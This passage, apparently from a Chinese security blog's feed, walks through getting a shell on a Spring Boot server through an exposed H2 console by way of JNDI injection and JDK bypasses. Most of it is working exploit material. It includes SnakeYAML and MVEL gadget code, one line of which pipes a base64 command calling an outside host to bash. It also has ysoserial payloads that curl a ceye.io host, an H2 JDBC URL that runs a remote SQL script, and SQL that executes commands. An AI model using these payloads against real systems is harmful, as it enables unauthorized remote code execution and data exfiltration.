function">info</span><span class="token punctuation">(</span>upperLookup<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"Hello, API Controller!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>珂字辈师傅已经写好了<a href="https://github.com/kezibei/Urldns">URLDNS</a>，可以生成探测需要的序列化数据包。当存在JNDI注入的时候，启动LDAP服务:<code>java -jar Urldns.jar ldap all &lt;dnslog&gt;</code>，然后使用PAYLOAD: <code>ldap://&lt;ip&gt;:1389/Hello233</code>。</p><h4 id="Snkeyml"><a href="#Snkeyml" class="headerlink" title="Snkeyml"></a>Snkeyml</h4><p>借用Ceye.io探测H2 Database的页面，发现可以利用的链很多，比如<code>cc1, cb17、mvel、snakeyaml</code>等，其中<code>cc1、cb17</code>这些链属于LDAP反序列化，<code>mvel、snkeyaml</code>属于加载本地Class。<br>浅蓝师傅在<a href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI漏洞的利用方法</a>里面讲的很详细，这里选择使用<code>snkeyml</code>攻击，主要利用代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_snakeyaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.yaml.snakeyaml.Yaml"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> yaml <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>            <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>            <span class="token string">"    !!java.net.URL [\"http://127.0.0.1:8888/exp.jar\"]\n"</span> <span class="token operator">+</span>            <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>            <span class="token string">"]"</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=load"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> yaml<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ref<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在服务端使用RMI托管，然后开启<a href="https://github.com/artsploit/yaml-payload">yaml-payload.jar</a>，可以成功执行命令。</p><h4 id="Mvel"><a href="#Mvel" class="headerlink" title="Mvel"></a>Mvel</h4><p>在更换MVEL执行的时候，本地测试弹计算器成功，但是换成执行命令就会失败，使用IDEA本地调试之后发现把push去掉，然后可以执行命令成功，具体原因需要再跟踪一遍：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ReferenceWrapper</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span><span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>            <span class="token string">"Runtime.getRuntime().exec('bash -c &#123;echo,Y3VybCBiYWlkdS5jb20vYHdob2FtaWA=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用LDAP返回反序列化数据，触发本地Gadget绕过"><a href="#利用LDAP返回反序列化数据，触发本地Gadget绕过" class="headerlink" title="利用LDAP返回反序列化数据，触发本地Gadget绕过"></a>利用LDAP返回反序列化数据，触发本地Gadget绕过</h3><p>LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的<code>javaSerializedData</code>属性值不为空，则客户端的<code>obj.decodeObject()</code>方法就会对这个字段的内容进行反序列化，攻击者仍然可以利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget达到绕过限制执行命令的目的。</p><p>使用CC链生成之后托管在LDAP：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopyjava -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">kxcode师傅的LDAP</a>托管生成的反序列化数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp HackerRMIRefServer-all.jar HackerLDAPRefServer  <span class="token number">0.0</span>.0.0 <span class="token number">8088</span> <span class="token number">1389</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/from-spring-boot-to-getshell/4.jpg"></p><p>但是在使用CommonsBeanutils1链的时候，执行命令失败:<br><img src="/2022/03/18/from-spring-boot-to-getshell/3.png"><br>可以从报错原因看出来，因为CommonsBeanutils1的版本不同，BeanComparator这个类的<a href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java#L119">SerialVersionUID不一样</a>，会造成反序列化失败。1.7x-1.8x为<code>-3490850999041592962</code>,1.9x为<code>-2044202215314119608</code>。<br>有两种解决方法：</p><ul><li>替换ysoserial的CommonsBeanutils1，使用<a href="https://github.com/su18/ysoserial">su18师傅的ysoserial</a>: <code>java -jar ysuserial-1.3-su18-all.jar -g CommonsBeanutils1183NOCC -p &#39;open -a Calculator.app&#39; |base64 |pbcopy</code></li><li>生成反序列化数据之后，<a href="https://github.com/phith0n/zkar">修改SerialVersionUID</a>为对应版本的值</li></ul><p>刚好早上看到P师傅发的文章，尝试使用<a href="https://github.com/phith0n/zkar">zkar</a>修改ysoserial生成的序列化数据包，可以执行命令成功。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"github.com/phith0n/zkar/serz"</span><span class="token string">"io/ioutil"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>data<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"cb1.ser"</span><span class="token punctuation">)</span>serialization<span class="token punctuation">,</span> err <span class="token operator">:=</span> serz<span class="token punctuation">.</span><span class="token function">FromBytes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span><span class="token string">"parse error"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>object <span class="token operator">:=</span> serialization<span class="token punctuation">.</span>Contents<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Object<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> field <span class="token operator">:=</span> <span class="token keyword">range</span> object<span class="token punctuation">.</span>ClassDatas<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>FieldDatas <span class="token punctuation">&#123;</span><span class="token keyword">if</span> field<span class="token punctuation">.</span>TypeCode <span class="token operator">==</span> <span class="token string">"L"</span> <span class="token punctuation">&#123;</span>classPonter <span class="token operator">:=</span> field<span class="token punctuation">.</span>Object<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>serz<span class="token punctuation">.</span>TCObject<span class="token punctuation">)</span><span class="token punctuation">.</span>ClassPointer<span class="token keyword">if</span> classPonter<span class="token punctuation">.</span>Flag <span class="token operator">==</span> serz<span class="token punctuation">.</span>JAVA_TC_CLASSDESC <span class="token operator">&amp;&amp;</span>classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>ClassName<span class="token punctuation">.</span>Data <span class="token operator">==</span> <span class="token string">"org.apache.commons.beanutils.BeanComparator"</span> <span class="token punctuation">&#123;</span>classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>SerialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3490850999041592962</span><span class="token keyword">break</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"cb1-modify.ser"</span><span class="token punctuation">,</span> serialization<span class="token punctuation">.</span><span class="token function">ToBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0o755</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2 RCE"></a>H2 RCE</h3><p>参考su18师傅的<a href="https://su18.org/post/jdbc-connection-url-attack/#h2-rce">jdbc-connection-url-attack</a>：</p><pre class="line-numbers language-none"><code class="language-none">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;poc.sql&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>远程服务器的恶意SQL:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ALIAS <span class="token keyword">EXEC</span> <span class="token keyword">AS</span> <span class="token string">'String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return "su18";&#125;'</span><span class="token punctuation">;</span><span class="token keyword">CALL</span> <span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'open -a Calculator.app'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Spring &lt; 2.3.0的时候，会默认创建<code>jdbc:h2:mem:testdb</code>，Spring &gt;= 2.3.0的时候，Spring会自动创建一个UUID随机数据库名，数据库名可以在Spirng的日志里看到。</p><p>所以使用这种方法的时候需要满足以下任意一个条件：</p><ul><li>Spring &lt; 2.3.0</li><li>提前获取到H2 database的用户密码</li></ul><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>RMI托管在VPS的时候，修改<a href="https://github.com/JKme/EvilRMI/blob/main/src/main/java/com/rmi/RmiServer.java#L180">java.rmi.server.hostname</a>为自己服务器的IP地址</li><li>在完全黑盒的情况下，注意SerialVersionUID不匹配的问题，具体见<a href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java">URLDNS</a></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://81.68.118.217/index.php/archives/62/">JNDI注入高版本绕过</a></li><li><a href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldns链探测类工具发放</a></li><li><a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">构造java探测class反序列化gadget</a></li><li><a href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">老链新用，利用URLDNS链探测gadget</a></li><li><a href="http://wjlshare.com/archives/1575">ysoserial 工具改造</a></li><li><a href="https://github.com/phith0n/zkar">zkar</a></li><li><a href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI漏洞的利用方法</a></li><li><a href="https://su18.org/post/jdbc-connection-url-attack">jdbc-connection-url-attack</a></li><li><a href="https://github.com/JKme/EvilRMI">https://github.com/JKme/EvilRMI</a></li><li><a href="https://github.com/su18/ysoserial">推荐使用su18是否的ysoserial</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-切入点&quot;&gt;&lt;a href=&quot;#0x1-切入点&quot; class=&quot;headerlink&quot; title=&quot;0x1. 切入点&quot;&gt;&lt;/a&gt;0x1. 切入点&lt;/h2&gt;&lt;p&gt;在日常测试的时候，使用ffuf发现一个&lt;code&gt;/console&lt;/code&gt;的接口，打开之后发现是H2 Database页面：&lt;br&gt;&lt;img src=&quot;/2022/03/18/from-spring-boot-to-getshell/1.png&quot;&gt;&lt;br&gt;如果Spring Boot项目中包含h2database并且在配置文件中启用h2-console，则存在&lt;a href=&quot;https://anquan.baidu.com/article/1078&quot;&gt;JNDI注入漏洞&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;设置&lt;code&gt;Driver Class&lt;/code&gt;为&lt;code&gt;javax.naming.InitialContext&lt;/code&gt;，&lt;code&gt;JDBC URL&lt;/code&gt;为&lt;code&gt;ldap://attacker.com/Exploit&lt;/code&gt;：&lt;br&gt;&lt;img src=&quot;/2022/03/18/from-spring-boot-to-getshell/2.png&quot;&gt;&lt;br&gt;根据&lt;code&gt;/env&lt;/code&gt;泄漏的信息，得知Java版本是1.8.0_312，高版本JDK中由于默认codebase为true从而导致客户端默认不会请求远程Server上的恶意 Class, 因此不可以直接使用LDAP加载远程恶意代码。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RMI：JDK 8u113、JDK 7u122、JDK 6u132 起 codebase 默认为 true&lt;br&gt;LDAP：JDK 11.0.1、JDK 8u191、JDK 7u201、JDK 6u211 起 codebase 默认为 true&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x2-绕过和利用&quot;&gt;&lt;a href=&quot;#0x2-绕过和利用&quot; class=&quot;headerlink&quot; title=&quot;0x2. 绕过和利用&quot;&gt;&lt;/a&gt;0x2. 绕过和利用&lt;/h2&gt;&lt;h3 id=&quot;利用本地Class作为Reference-Factory绕过&quot;&gt;&lt;a href=&quot;#利用本地Class作为Reference-Factory绕过&quot; class=&quot;headerlink&quot; title=&quot;利用本地Class作为Reference Factory绕过&quot;&gt;&lt;/a&gt;利用本地Class作为Reference Factory绕过&lt;/h3&gt;&lt;p&gt;利用URLDNS链可以探测Java黑盒应用里面某个类是否存在, 在珂字辈和c0ny1师傅的两篇文章讲的很详细：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw&quot;&gt;Urldns链探测类工具发放&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA&quot;&gt;构造java探测class反序列化gadget&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA&quot;&gt;老链新用，利用URLDNS链探测gadget&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;URLDNS的测试代码，生成一个序列化的数据包&lt;code&gt;1.ser&lt;/code&gt;：&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;net&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;URL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javassist&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javassist&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;CtClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Urldns&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt; hashMap &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token class-name&quot;&gt;URL&lt;/span&gt; url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;http://333.f9575af1.dns.1433.eu.org&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt; f &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.net.URL&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;hashCode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token comment&quot;&gt;//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);&lt;/span&gt;
          hashMap&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;org.apache.commons.beanutils.BeanComparator&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ObjectOutputStream&lt;/span&gt; oos &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;1.ser&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        oos&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;writeObject&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;hashMap&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;1.ser&quot;));&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//ois.readObject();&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; clazzName&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt; classPool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDefault&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
